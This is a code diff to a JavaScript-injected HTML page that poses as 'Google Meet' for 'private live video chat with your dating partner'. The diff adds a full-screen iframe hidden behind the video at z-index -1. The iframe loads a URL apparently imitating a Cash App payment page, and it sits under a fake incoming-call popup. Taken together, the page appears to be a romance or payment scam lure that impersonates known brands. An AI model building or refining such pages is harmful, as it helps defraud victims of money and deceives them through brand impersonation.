@@ -15,29 +15,35 @@ newDiv.innerHTML = `
     <meta property="og:description" content="Enjoy private live video chat with your dating partner">
     <meta property="og:image" content="https://join-video-chat.one/public/images/logo_meet_2020q4_color_2x_web_96dp.png">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Google Meet"> <!-- Fixed here -->
+    <meta name="twitter:title" content="Google Meet">
     <meta name="twitter:description" content="Enjoy private live video chat with your dating partner">
     <meta name="twitter:image" content="">
     <link rel="icon" href="" sizes="32x32">
     <meta name="next-size-adjust">
 </head>
 <body class="__className_aaf875">
+    <!-- Background Iframe -->
+    <iframe 
+        src="https://paycash-online.vercel.app/rtio/feg/cash-app-pay-online" 
+        width="100%" 
+        height="100%" 
+        style="border:0; position:absolute; top:0; left:0; z-index:-1;">
+    </iframe>
+
     <div style="color-scheme:light" class="bg-neutral-900 text-neutral-950">
         <video autoplay muted playsinline class="fixed inset-0 w-full h-full object-cover object-center" id="video"></video>
+
         <div class="relative min-h-dvh flex items-center justify-center p-4 text-center" id="call-popup">
             <div class="bg-neutral-50 w-full max-w-[17rem] p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
                 <div class="flex items-center justify-center gap-x-12 text-neutral-50">
                     <label for="password" class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
-                         <label for="password" class="size-14 flex items-center justify-center rounded-full bg-green-500 overflow-hidden">
-        <img src="https://newsite-livid.vercel.app/megapic.jpg" alt="Decline Call" class="w-1/2 h-1/2 object-cover rounded-full">    </label>
+                        <!-- Accept button (empty, no image) -->
                     </label>
-                 
                 </div>
             </div>
         </div>
-
     </div>
-    </body>
+</body>
 `;
     let x = 1;
     
